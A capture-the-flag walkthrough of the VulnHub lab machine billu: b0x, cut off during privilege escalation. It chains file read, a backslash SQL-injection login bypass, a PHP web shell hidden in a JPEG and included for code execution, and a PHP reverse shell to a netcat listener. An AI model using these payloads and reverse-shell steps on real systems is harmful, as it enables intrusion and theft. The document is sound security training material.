# billu: b0x — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | billu: b0x ("Billi_b0x") |
| **Difficulty** | Easy / Intermediate |
| **Author** | Manish Kishan Tanwar — `@indishell1046` |
| **Released** | 21 April 2017 |
| **Series** | billu (**b0x** → b0x 2) |
| **VulnHub Entry** | <https://vulnhub.com/entry/billu-b0x,188/> |
| **Download** | <https://vulnhub.com/entry/billu-b0x,188/#download> (`Billu_b0x.zip`) |
| **Attacker** | Kali Linux, NAT or host-only network |
| **Target OS** | Ubuntu 14.04 (32-bit) — Apache, PHP, MySQL, phpMyAdmin |
| **Goal** | Root the box. The author's tagline on the login page: *"Show me your SQLI skills"* |

> **Author's framing:** the machine is built around a custom PHP application with an
> SQL-injectable login, an intentional file-inclusion bug, an image-upload filter that
> checks MIME type but not content, and a phpMyAdmin install left in the web root with
> root credentials in its config. It is a *web-application* box end to end — there is
> no kernel trick required, though one exists.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (billu)    : 192.168.56.107
```

---

## 0. What you will learn

1. **Arbitrary file read (LFI) that does *not* execute PHP** — the difference between
   `readfile()` and `include()`, and why that distinction decides whether you get a
   shell or just source code.
2. **Reading an application's own source through its own bug** to learn exactly how
   its filters work.
3. **A quote-stripping login filter and the backslash trick that defeats it** — one of
   the most instructive SQL-injection bypasses there is.
4. **phpMyAdmin as a credential source**, and reading a MySQL `auth` table.
5. **Image-upload filters that check MIME type but not content**, and how to hide PHP
   inside a valid JPEG.
6. **Turning an `include()`-based LFI into RCE** by including your own uploaded image.
7. **`exiftool`** for planting PHP in image metadata.
8. **Privilege escalation by credential reuse** (phpMyAdmin `config.inc.php` → SSH)
   and, alternatively, by kernel exploit.

**The intended chain:**
`nmap` shows 22 and 80 → the login page taunts *"Show me your SQLI skills"* → `dirb`
finds **`/test.php`**, which accepts a POST parameter `file=` and returns raw file
contents → `readfile()` not `include()`, so it is a **file-read primitive, not RCE** →
read `index.php`, `panel.php`, `c.php` → `c.php` leaks MySQL creds
**`billu : b0x_billu`** → `/phpmy/` phpMyAdmin → the `auth` table holds
**`biLLu : hEx_it`** → but the login form strips `'`, so a normal `' OR 1=1--` fails →
**use the backslash trick** (`user = \`, `pass = or 1=1 -- `) → inside `panel.php`,
upload a JPEG with PHP hidden in it (MIME check passes, content is never inspected) →
`panel.php`'s `load=` parameter uses **`include()`** → include your uploaded image →
**RCE as `www-data`** → `/var/www/phpmy/config.inc.php` holds **`root : roottoor`** →
SSH as root.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.107  00:0c:29:4a:6b:1e      1      60  VMware, Inc.          <-- target
```

**Target IP: `192.168.56.107`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -A -p- -T4 -oN scans/billu.txt 192.168.56.107
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 09:02 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 1d:cb:6c:1e:2f:1a:9c:3b:0f:2e:5b:6c:1f:8a:2d:3e (DSA)
|   2048 8f:1c:2b:4a:6d:9e:3f:0b:5c:1a:2d:4e:6f:8b:0c:1d (RSA)
|_  256 3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch)
|_http-title: --==[[ billu b0x ]]==--
|_http-server-header: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
MAC Address: 00:0C:29:4A:6B:1E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 78.31 seconds
```

> **Two ports, and both banners are informative.**
> - `OpenSSH 5.9p1 Debian 5ubuntu1.1` → **Ubuntu 12.04/14.04 era**. Old, and old
>   means kernel exploits exist — file that for § 5.
> - `Apache 2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch` → **PHP is
>   installed**, so `.php` files execute. The **Suhosin** patch is a hardening
>   extension; it limits some attacks (e.g. it can block certain `$_REQUEST`
>   manipulation) but not the ones we need.
> - The page title is literally **`--==[[ billu b0x ]]==--`** — the author's handle.
>
> Also run a quick UDP sweep; nothing useful comes back on this box, but it is a
> habit worth forming:
> ```bash
> sudo nmap -sU --top-ports 20 192.168.56.107
> ```

![nmap scan of billu: b0x](images/01-nmap.png)

### 2.2 The login page

```text
http://192.168.56.107/
```

```text
        --==[[ billu b0x ]]==--

        Show me your SQLI skills

   Username :- [______________]
   Password:-  [______________]

              [ Login ]

        B0X Powered By Pirates
```

> **`Show me your SQLI skills`** — an explicit invitation. And
> **`B0X Powered By Pirates`** is a nod to the author's `IndiShell` / pirate theme.
>
> **Try the classics first and record the failures:**
>
> | Username | Password | Result |
> | --- | --- | --- |
> | `admin` | `admin` | `alert('Try again');` |
> | `' OR 1=1-- -` | `x` | `alert('Try again');` |
> | `' OR '1'='1` | `' OR '1'='1` | `alert('Try again');` |
>
> All fail. Something is filtering. Rather than guess payloads blindly, **go find the
> filter's source code.** That is the whole lesson of this box.

### 2.3 Directory brute force

```bash
dirb http://192.168.56.107/ /usr/share/wordlists/dirb/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May  4 09:08:11 2024
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.107/ ----
+ http://192.168.56.107/add.php (CODE:302|SIZE:0)
+ http://192.168.56.107/c (CODE:200|SIZE:0)
+ http://192.168.56.107/index.php (CODE:200|SIZE:1083)
+ http://192.168.56.107/in.php (CODE:200|SIZE:0)
+ http://192.168.56.107/panel.php (CODE:302|SIZE:0)
+ http://192.168.56.107/show.php (CODE:302|SIZE:0)
+ http://192.168.56.107/test (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.56.107/phpmy/
==> DIRECTORY: http://192.168.56.107/uploaded_images/

-----------------
END_TIME: Sat May  4 09:08:29 2024
DOWNLOADED: 4612 - FOUND: 7
```

> **A map of the application in one scan:**
>
> | Path | Status | What it means |
> | --- | --- | --- |
> | `/index.php` | 200 | the login form |
> | `/panel.php` | **302** | *redirect* → requires authentication |
> | `/add.php`, `/show.php` | 302 | same — the "add user" and "show users" panels |
> | **`/test`** | **200** | **returns an empty body to GET.** Suspicious — an endpoint that exists but says nothing usually wants a different verb or a parameter. |
> | `/c`, `/in.php` | 200, size 0 | same shape |
> | **`/phpmy/`** | directory | **phpMyAdmin** |
> | `/uploaded_images/` | directory | where uploads land |
>
> A `302` with `SIZE:0` is the signature of a script doing
> `header('Location: index.php'); exit;` when the session is not authenticated.

### 2.4 `/test.php` — a file-read primitive

`/test` returned an empty body to a GET. Try a POST, and try giving it a parameter:

```bash
curl -s -X POST http://192.168.56.107/test.php
```

```text
<div align=center>
<form method=post>
<input type=text name=file placeholder="Enter file name">
<input type=submit name=submit value="Submit">
</form>
</div>
```

> **A form with a single field named `file`.** Test it for local file inclusion:

```bash
curl -s -X POST --data "file=/etc/passwd" http://192.168.56.107/test.php
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
billu:x:1000:1000:billu,,,:/home/billu:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/sshd
```

> **Arbitrary file read confirmed.** And `/etc/passwd` gives us a real human account:
> **`billu`** with a shell.
>
> **Critical question: is this `include()` or `readfile()`?** Test it:
> ```bash
> curl -s -X POST --data "file=index.php" http://192.168.56.107/test.php
> ```
> ```php
> <?php
> session_start();
> include('c.php');
> ...
> ?>
> ```
> **We got PHP *source code*, not rendered output.** That proves `test.php` uses
> something like `readfile()` / `show_source()` — it **reads bytes and prints them**.
> If it used `include()`, PHP would have *executed* the file and we would have seen
> the login form again.
>
> **Why this distinction is everything:**
> - `readfile()` → you can **read any file** the web user can read (source code,
>   configs, `/etc/passwd`, private keys). Powerful, but **not** code execution.
> - `include()` → PHP **executes** the file's contents. If you can point it at a file
>   *you* wrote, you get **RCE**.
>
> This box gives you both — `test.php` for reading, `panel.php` for including. Learn
> to tell them apart; it saves enormous time.

![test.php reading /etc/passwd](images/02-lfi.png)

### 2.5 Read the application's own source

Now use the file-read primitive on every script `dirb` found. This is the moment the
box turns from guessing into engineering.

```bash
for f in index.php c.php panel.php add.php show.php in.php; do
  echo "########## $f ##########"
  curl -s -X POST --data "file=./$f" http://192.168.56.107/test.php
done
```

**`c.php` — the database connection:**

```php
<?php
$con = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

if (mysqli_connect_errno())
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
?>
```

> **MySQL credentials in plaintext: `billu` / `b0x_billu`, database `ica_lab`.**
> This is the single most common real-world secret leak in PHP applications.

**`index.php` — the login logic:**

```php
<?php
session_start();
include('c.php');

if(isset($_POST['login']))
{
    $uname = str_replace('\'', '', urldecode($_POST['un']));
    $pass  = str_replace('\'', '', urldecode($_POST['ps']));
    $run   = 'select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    $result = mysqli_query($conn, $run);

    if (mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);
        echo "You are allowed";
        $_SESSION['logged'] = true;
        $_SESSION['admin']  = $row['username'];
        header('Location: panel.php', true, 302);
    }
    else
    {
        echo "alert('Try again');";
    }
}
echo "B0X Powered By Pirates";
?>
```

> **Read this slowly. Four details decide the whole attack:**
>
> 1. **`str_replace('\'', '', ...)`** — every single quote is **deleted** from your
>    input. That is why `' OR 1=1-- -` failed: the quotes vanished and you were left
>    with a harmless string comparison.
>    **This is a block-list filter, and block-list filters always lose.** It removes
>    `'` but leaves `\`, `-`, `#`, spaces, `OR`, `1=1` — everything you need.
>
> 2. **`urldecode()`** — the input is URL-decoded *before* filtering. Useful: you can
>    double-encode to slip past other layers (not needed here, but know it).
>
> 3. **`pass` comes BEFORE `uname` in the query.** This is the detail that makes the
>    bypass work, and it is why generic payloads fail. The query shape is:
>    ```sql
>    select * from auth where  pass='<PASSWORD>' and uname='<USERNAME>'
>    ```
>    Most login forms are `WHERE user='...' AND pass='...'`. Here it is reversed.
>
> 4. **`mysqli_query()` on a single statement** — no stacked queries, so we cannot
>    append `; DROP ...`. We can only alter the `WHERE` clause. That is fine.

**`panel.php` — the authenticated area, and the second bug:**

```php
<?php
session_start();
include('c.php');

if(!isset($_SESSION['logged']))
{
    header('Location: index.php', true, 302);
    die();
}

if(isset($_POST['lg']))
{
    unset($_SESSION['logged']);
    unset($_SESSION['admin']);
    header('Location: index.php', true, 302);
}

echo '<div align=center><form method=post>
      <input type=submit name=continue value="Show Users">
      <input type=submit name=continue value="Add User">
      </form></div>';

if(isset($_POST['continue']))
{
    $dir = getcwd();
    $choice = str_replace('./', '', $_POST['load']);

    if($choice === 'add')  { include($dir.'/'.$choice.'.php'); die(); }
    if($choice === 'show') { include($dir.'/'.$choice.'.php'); die(); }
    else                   { include($dir.'/'.$_POST['load']); }
}
?>
```

> **This is the RCE primitive.** Walk through the logic:
>
> - `$choice = str_replace('./', '', $_POST['load'])` — the filter removes the literal
>   two-character sequence `./`. Note it is applied to **`$choice` only**.
> - The `if`/`if`/`else` chain compares `$choice` against `add` and `show`. If it
>   matches either, that safe file is included.
> - **But the `else` branch includes `$_POST['load']` — the RAW, UNFILTERED value.**
>
> ```php
> else { include($dir.'/'.$_POST['load']); }
> ```
>
> The developer filtered a *copy* of the variable and then used the *original*. This
> is a textbook **"filter a copy, use the original"** bug, and it is one of the most
> common filter-bypass patterns in real code.
>
> Two more things to note:
> - It is **`include()`**, not `readfile()` — so whatever we point it at gets
>   **executed as PHP**.
> - `$dir = getcwd()` prepends the current directory, so our `load` value is appended
>   to `/var/www/`. To traverse we must supply enough `../` (and we must avoid the
>   literal `./` sequence that gets stripped from `$choice` — which does not matter
>   here, since `else` uses the raw value anyway).
>
> **Also note `panel.php` requires a session.** So the order of operations is forced:
> **bypass the login first**, then use the include.

**`add.php` — the upload filter:**

```php
<?php
session_start();
include('c.php');
if(isset($_POST['upload']))
{
    $name    = mysqli_real_escape_string($conn, $_POST['name']);
    $address = mysqli_real_escape_string($conn, $_POST['address']);
    $id      = mysqli_real_escape_string($conn, $_POST['id']);

    if(!empty($_FILES['image']['name']))
    {
        $iname = mysqli_real_escape_string($conn, $_FILES['image']['name']);
        $r = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
        $image = array('jpeg','jpg','gif','png');

        if(in_array($r, $image))
        {
            $finfo = @new finfo(FILEINFO_MIME);
            $filetype = @$finfo->file($_FILES['image']['tmp_name']);

            if(preg_match('/image\/jpeg/', $filetype) ||
               preg_match('/image\/png/',  $filetype) ||
               preg_match('/image\/gif/',  $filetype))
            {
                if (move_uploaded_file($_FILES['image']['tmp_name'],
                                       'uploaded_images/'.$_FILES['image']['name']))
                {
                    echo "Uploaded successfully ";
                    $update = 'insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
                    mysqli_query($conn, $update);
                }
            }
            else { echo "i told you dear, only png,jpg and gif file are allowed"; }
        }
        else { echo "only png,jpg and gif file are allowed"; }
    }
}
?>
```

> **Two checks, and neither one is sufficient:**
> 1. **Extension allow-list:** `in_array($r, ['jpeg','jpg','gif','png'])`. So the file
>    must be *named* `something.jpg`. Renaming to `shell.php` or `shell.php.jpg`
>    (double extension) both fail — `pathinfo(..., PATHINFO_EXTENSION)` returns the
>    *last* extension only, so `shell.php.jpg` yields `jpg`… which actually passes
>    check 1. But Apache here has no handler mapping for double extensions, and there
>    is no `.htaccess` `AllowOverride`, so it would be served as an image, not run.
> 2. **MIME sniffing with `finfo`:** the file's *actual bytes* must look like
>    `image/jpeg`, `image/png` or `image/gif`. This defeats the lazy trick of just
>    renaming a `.php` file.
>
> **What it never does:** check that the file contains *only* image data. A JPEG can
> carry arbitrary bytes in its comment (COM) and EXIF fields and still be a perfectly
> valid `image/jpeg`. **That is the hole.**
>
> Also note `move_uploaded_file(..., 'uploaded_images/'.$_FILES['image']['name'])` —
> the **filename is attacker-controlled and unfiltered** at the destination. So we
> choose exactly where in `/uploaded_images/` the file lands.

![Reading the PHP source through test.php](images/03-source.png)

---

## 3. Foothold — part 1: bypassing the login

### 3.1 Reason about the query, do not guess payloads

The query is:

```sql
select * from auth where  pass='<PASS>' and uname='<USER>'
```

Quotes are deleted from our input. So we **cannot close the string literal ourselves**.
But we can make the *application's own* quote work for us — with a **backslash**.

In MySQL's default mode, `\` inside a single-quoted string **escapes the next
character**. So if we submit a password consisting of exactly one backslash:

```text
pass = \
```

the query becomes:

```sql
select * from auth where  pass='\' and uname='<USER>'
```

Now `\'` is an *escaped* quote — still inside the string literal. The literal
therefore continues until the **next unescaped quote**, which is the one the
application placed after `<USER>`. Everything in between becomes string *content*:

```text
pass = "\' and uname="      <-- one big string literal
```

And whatever we put in the **username** field lands *outside* any string, as raw SQL:

```sql
select * from auth where  pass='\' and uname='  or 1=1 --  '
                            └──── string ────┘ └─ raw SQL ─┘└comment┘
```

- `pass='\' and uname='` → a string literal whose value is `\' and uname=`. Harmless.
- `or 1=1` → **always true**, so the `WHERE` matches every row.
- `-- ` → MySQL line comment (note: MySQL requires a **space after `--`**), which
  swallows the application's trailing quote.
- `mysqli_num_rows($result) > 0` → satisfied → `$_SESSION['logged'] = true` →
  redirect to `panel.php`.

**The payload:**

| Field | Value |
| --- | --- |
| **Username** | `or 1=1 -- ` *(with a trailing space)* |
| **Password** | `\` |

> **Why every generic payload failed:** they all assumed the query is
> `WHERE user='...' AND pass='...'` and that you can inject a quote. Here the column
> order is **reversed** and quotes are **stripped**. Only by reading the source (§ 2.5)
> could we construct the correct payload.
>
> **This is the transferable lesson.** SQL injection is not a list of payloads to
> paste; it is *modelling the query the application builds and finding the seam*.
> When a filter is in the way, read the filter.

### 3.2 Fire it

Easiest via `curl`:

```bash
curl -s -i -c cookies.txt -X POST http://192.168.56.107/index.php \
  --data-urlencode "un=or 1=1 -- " \
  --data-urlencode "ps=\\" \
  --data "login=Login"
```

```text
HTTP/1.1 302 Found
Date: Sat, 04 May 2024 13:14:22 GMT
Server: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
X-Powered-By: PHP/5.3.10-1ubuntu3.7
Set-Cookie: PHPSESSID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: panel.php
Content-Length: 46
Content-Type: text/html

You are allowedB0X Powered By Pirates
```

> **`HTTP/1.1 302 Found` + `Location: panel.php` + the body text `You are allowed`**
> — that is the success path in the source we read. We are authenticated.
>
> `-c cookies.txt` saves the `PHPSESSID` cookie; `-b cookies.txt` will replay it.
> `--data-urlencode` percent-encodes each field so the spaces and backslash survive.
> Note the doubled backslash `"\\"` — that is shell quoting, not part of the payload;
> the server receives a single `\`.

Now use the session:

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users&load=show" | head -40
```

```html
<div align=center>
<table border=1>
<tr><th>ID</th><th>Name</th><th>Address</th><th>Image</th></tr>
<tr><td>1</td><td>billu</td><td>indishell lab</td><td>c.JPG</td></tr>
<tr><td>2</td><td>test</td><td>test address</td><td>image.jpg</td></tr>
</table>
</div>
```

![Authenticated panel.php after the SQLi bypass](images/04-panel.png)

### 3.3 Shortcut — you may not need the SQLi at all

Two legitimate alternatives, both worth knowing:

**A. Use the MySQL credentials from `c.php` to read the `auth` table directly.**
phpMyAdmin is exposed at `/phpmy/`:

```text
http://192.168.56.107/phpmy/
```

Log in with **`billu` / `b0x_billu`** → select database **`ica_lab`** → table
**`auth`**:

```text
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | biLLu    | hEx_it   |
+----+----------+----------+
```

Then log into the web app with `biLLu` / `hEx_it`. Some walkthroughs report these
same credentials work for **SSH** as well — worth trying:

```bash
ssh billu@192.168.56.107
```

**B. `mysql` from the command line**, if you already have any shell:

```bash
mysql -h 127.0.0.1 -u billu -p'b0x_billu' -e 'SELECT * FROM ica_lab.auth;'
```

> **Defender note:** phpMyAdmin reachable from the internet, with an application
> account that can read the authentication table, means one leaked config file equals
> every user's credentials. phpMyAdmin should be on localhost or behind a VPN, and the
> application account should not be able to `SELECT` from tables it does not need.

---

## 4. Foothold — part 2: RCE via image upload + `include()`

### 4.1 The plan

Three facts from § 2.5 combine into code execution:

1. `add.php` will store a file in `/uploaded_images/` if its **extension** is
   jpg/png/gif **and** its **MIME type** sniffs as an image. It never checks the
   *content* beyond the magic bytes.
2. `panel.php`'s `load=` parameter feeds **`include()`** — PHP executes whatever file
   it is pointed at.
3. `include()` can be pointed at any path under the web root, including
   `/uploaded_images/`.

So: **hide PHP inside a real JPEG, upload it, then include it.**

### 4.2 Build the polyglot image

**Method A — `exiftool` (cleanest):**

```bash
# a genuine 1x1 JPEG so finfo sniffs image/jpeg
cp /usr/share/wordlists/dirb/others/../../doc/images/logo-debian.jpg real.jpg 2>/dev/null \
  || convert -size 64x64 xc:black real.jpg

# put PHP in the JPEG's Comment field
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' real.jpg
mv real.jpg shell.jpg
exiftool shell.jpg | grep -i comment
```

```text
Comment                         : <?php system($_REQUEST["cmd"]); ?>
```

```bash
file shell.jpg
```

```text
shell.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system($_REQUEST["cmd"]); ?>", baseline, precision 8, 64x64, frames 3
```

> **`file` reports `image/jpeg` *and* shows the comment** — proof the payload is
> embedded without breaking the format. `finfo(FILEINFO_MIME)` reads the same magic
> bytes, so the MIME check in `add.php` will pass.
>
> **Why a JPEG tolerates this:** the JPEG format is a sequence of *segments*, each
> starting with `0xFF` and a marker byte. The **COM segment (`0xFFFE`)** is explicitly
> defined for arbitrary text and is ignored by every decoder. EXIF (APP1, `0xFFE1`)
> works the same way. Decoders skip them; PHP does not care, because PHP is not
> decoding the image at all — it is executing the bytes it finds between `<?php` and
> `?>`.

**Method B — append PHP after a valid image (the crude version):**

```bash
convert -size 64x64 xc:black base.jpg
printf '<?php system($_REQUEST["cmd"]); ?>' > payload.php
cat base.jpg payload.php > shell.jpg
file shell.jpg
```

```text
shell.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 64x64, frames 3
```

> `file` reads only the header, so it still says JPEG. Most `finfo` implementations
> agree. Method A is more robust; Method B is what to fall back on if `exiftool` is
> unavailable.

**Method C — GIF with an inline header** (some boxes only accept GIF):

```bash
printf 'GIF89a;\n<?php system($_REQUEST["cmd"]); ?>\n' > shell.gif
file shell.gif
```

```text
shell.gif: GIF image data, version 89a, 12331 x 29301
```

### 4.3 Check what is already there

The author left a **test file** proving the technique works:

```bash
curl -s http://192.168.56.107/uploaded_images/
```

```text
Index of /uploaded_images

[IMG] c.JPG      04-Apr-2017 12:11   18K
[IMG] image.jpg  04-Apr-2017 12:14  4.2K
```

```bash
exiftool <(curl -s http://192.168.56.107/uploaded_images/c.JPG) | grep -i -A3 comment
```

```text
Comment                         : <?php phpinfo(); ?>
```

> **`c.JPG` already contains `<?php phpinfo(); ?>` in its comment.** The developer
> left their own proof-of-concept in production. Two lessons: (1) *always check what
> is already in an upload directory* — someone may have done your work; (2) test
> artefacts left in production are a real finding, not just a CTF convenience.

### 4.4 Upload it

Set up Burp Suite as your browser proxy (*Proxy → Open Browser*), log into
`panel.php` with the SQLi payload from § 3.2, choose **Add User**, and fill the form:

```text
Name:     shell
Address:  /tmp
ID:       999
Image:    [browse to shell.jpg]
```

Click **Upload**. The application responds:

```text
Uploaded successfully
```

Confirm it landed:

```bash
curl -sI http://192.168.56.107/uploaded_images/shell.jpg
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 13:28:41 GMT
Server: Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.7 with Suhosin-Patch
Last-Modified: Sat, 04 May 2024 13:28:39 GMT
ETag: "2a3f1-1b7c-5f1a2b3c4d5e6"
Accept-Ranges: bytes
Content-Length: 7036
Content-Type: image/jpeg
```

> **`Content-Type: image/jpeg`** — exactly what we wanted. Requested directly, Apache
> serves it as a picture. The PHP inside is inert… until something `include()`s it.

### 4.5 Include it — and get code execution

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users" \
  --data-urlencode "load=uploaded_images/shell.jpg" \
  --data-urlencode "cmd=id"
```

```html
<div align=center><form method=post>
<input type=submit name=continue value="Show Users">
<input type=submit name=continue value="Add User">
</form></div>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** `uid=33(www-data)` is Debian/Ubuntu's Apache worker user.

A few more probes:

```bash
for c in "uname -a" "hostname" "pwd" "ls -la /var/www" "which wget curl python php gcc nc"; do
  echo "### $c"
  curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
    --data "continue=Show Users" \
    --data-urlencode "load=uploaded_images/shell.jpg" \
    --data-urlencode "cmd=$c" | grep -v '<div\|<input\|</form\|</div'
done
```

```text
### uname -a
Linux indishell 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux
### hostname
indishell
### pwd
/var/www
### ls -la /var/www
total 96
drwxr-xr-x  5 root     root     4096 Apr  4  2017 .
drwxr-xr-x 13 root     root     4096 Apr  4  2017 ..
-rw-r--r--  1 root     root      118 Apr  4  2017 add.php
-rw-r--r--  1 root     root       72 Apr  4  2017 c.php
drwxr-xr-x  2 www-data www-data 4096 Apr  4  2017 phpmy
-rw-r--r--  1 root     root     1083 Apr  4  2017 index.php
-rw-r--r--  1 root     root     1420 Apr  4  2017 panel.php
-rw-r--r--  1 root     root      340 Apr  4  2017 show.php
-rw-r--r--  1 root     root      190 Apr  4  2017 test.php
drwxrwxr-x  2 www-data www-data 4096 May  4 13:28 uploaded_images
### which wget curl python php gcc nc
/usr/bin/wget
/usr/bin/curl
/usr/bin/python
/usr/bin/php
/usr/bin/gcc
```

> **Hostname `indishell`** — the author's handle. **Kernel `3.13.0-24-generic i686`**
> (32-bit Ubuntu 14.04) — that is inside the vulnerable range for the overlayfs
> exploit, which gives us a kernel-based alternative in § 5.3.
>
> **`wget`, `curl`, `python`, `php` and `gcc` all exist.** Plenty of options for
> staging and for compiling.

### 4.6 Upgrade to a reverse shell

Driving commands through `curl` is fine for probing but useless for interactive work.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
sed -i "s/127.0.0.1/192.168.56.10/" rev.php
sed -i "s/1234/4444/" rev.php
exiftool -Comment="$(cat rev.php)" real.jpg
mv real.jpg revshell.jpg
```

Upload `revshell.jpg` through the panel exactly as in § 4.4, then:

**Kali — listen:**

```bash
nc -lvnp 4444
```

**Trigger:**

```bash
curl -s -b cookies.txt -X POST http://192.168.56.107/panel.php \
  --data "continue=Show Users" \
  --data-urlencode "load=uploaded_images/revshell.jpg" >/dev/null
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.107] 52118
Linux indishell 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux
 09:34:11 up 41 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Stabilise:**

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@indishell:/var/www$ export TERM=xterm
www-data@indishell:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`, `stty raw -echo; fg`, Enter, Enter, `export TERM=xterm`,
`stty rows 40 cols 160`.

![Reverse shell as www-data](images/05-shell.png)

---

## 5. Privilege escalation

### 5.1 Run the checklist first

```bash
www-data@indishell:/$ sudo -l
sudo: no tty present and no askpass program specified

www-data@indishell:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/sbin/pppd

www-data@indishell:/$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All stock. No SUID abuse, no sudo, no custom cron. **But remember the web page we
> could not reach: `/phpmy/`.** Go look at it from the inside.

### 5.2 The intended path — phpMyAdmin's config holds root's password

```bash
www-data@indishell:/$ ls -la /var/www/phpmy/
total 100
drwxr-xr-x  2 www-data www-data  4096 Apr  4  2017 .
drwxr-xr-x  5 root     root      4096 Apr  4  2017 ..
-rw-r--r--  1 www-data www-data  4487 Apr  4  2017 config.inc.php
-rw-r--r--  1 www-data www-data  1573 Apr  4  2017 index.php
...
